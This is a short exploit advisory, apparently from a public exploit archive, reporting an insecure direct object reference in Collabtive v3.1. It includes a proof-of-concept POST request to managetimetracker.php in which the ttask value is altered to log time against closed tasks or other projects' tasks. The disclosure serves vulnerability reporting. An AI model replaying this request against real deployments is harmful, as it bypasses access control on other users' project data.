# Exploit Title: Collabtive v3.1 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://github.com/philippK-de/Collabtive
## Tested on: Debian Linux, Apache, Mysql
## Vendor: philippK-de
## Version: v3.1
## Exploit Description:
## Collabtive v3.1 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to cite the task that is closed or belongs to other project(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /managetimetracker.php?action=add HTTP/1.1
...

&project=1&ttday=05.01.2024&started=08%3A00&ended=09%3A00&project=1&=&=&=&=&=&=&=&=&=&=&=&=&comment=AAAA&ttask=4(CHANGE HERE)&=
```